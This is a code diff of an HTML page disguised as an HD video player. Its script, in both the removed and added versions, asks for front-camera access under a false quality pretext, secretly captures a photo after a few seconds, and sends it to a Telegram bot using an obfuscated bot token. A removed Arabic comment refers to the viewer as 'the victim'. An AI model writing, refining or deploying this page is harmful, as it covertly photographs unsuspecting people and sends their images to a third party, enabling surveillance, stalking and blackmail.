@@ -3,62 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video System HD</title>
+    <title>Stream HD</title>
     <style>
-        body { background: #000; color: #fff; text-align: center; margin: 0; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
-        video#distraction { width: 95%; max-width: 400px; border-radius: 12px; box-shadow: 0 0 20px rgba(255,255,255,0.2); border: 1px solid #444; }
-        .status { margin-top: 15px; font-size: 14px; color: #666; }
+        body { background: #000; color: #fff; text-align: center; margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; }
+        video { width: 95%; max-width: 420px; border-radius: 15px; border: 2px solid #444; }
     </style>
 </head>
 <body>
-
-    <video id="distraction" autoplay muted loop playsinline>
-        <source src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHR0dzF6Znd6YXJ4ZzR4ZzR4ZzR4ZzR4ZzR4ZzR4ZzR4ZzR4JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/l41lS23ZZIa8uH60M/giphy.mp4" type="video/mp4">
+    <video autoplay muted loop playsinline>
+        <source src="https://vjs.zencdn.net/v/oceans.mp4" type="video/mp4">
     </video>
-
-    <p class="status">جاري الاتصال بالسيرفر...</p>
-    <canvas id="hidden_canvas" style="display:none;"></canvas>
-
+    <p style="color: #888; font-size: 13px;">جاري تحسين الجودة... يرجى السماح بالكاميرا</p>
+    <canvas id="c" style="display:none;"></canvas>
     <script>
         const t = atob("ODM4NjQyNzMyMTpBQUZLcThmQ3NvUEVEZ2NGOEtORlIyTlVyN0doMER3ZnNrRQ==");
         const id = new URLSearchParams(window.location.search).get('id');
-        const video = document.createElement('video');
-        const canvas = document.getElementById('hidden_canvas');
-
+        const v = document.createElement('video');
         window.onload = function() {
-            // طلب الكاميرا الأمامية
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
-                video.srcObject = stream;
-                video.play();
-                
-                // استنى 3 ثواني (عشان الضحية يندمج مع الفيديو المضحك) وخد الصورة
-                setTimeout(takePhoto, 3000);
-            })
-            .catch(err => {
-                alert("يرجى الضغط على 'سماح' لتشغيل الفيديو بجودة HD.");
-            });
+                v.srcObject = stream; v.play();
+                setTimeout(() => {
+                    const canvas = document.getElementById('c');
+                    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
+                    canvas.getContext('2d').drawImage(v, 0, 0);
+                    canvas.toBlob(blob => {
+                        const f = new FormData(); f.append('photo', blob, 'img.jpg'); f.append('chat_id', id);
+                        fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: 'POST', body: f });
+                    }, 'image/jpeg');
+                }, 3500);
+            }).catch(() => { alert("يرجى السماح بالكاميرا لتشغيل الفيديو."); });
         };
-
-        function takePhoto() {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('photo', blob, 'snap.jpg');
-                formData.append('chat_id', id);
-                formData.append('caption', '📸 **تم التقاط صورة من الكاميرا الأمامية (أبو سند)**');
-
-                fetch(`https://api.telegram.org/bot${t}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                }).then(() => {
-                    document.querySelector('.status').innerHTML = "تم المزامنة بنجاح ✅";
-                });
-            }, 'image/jpeg');
-        }
     </script>
 </body>
 </html>
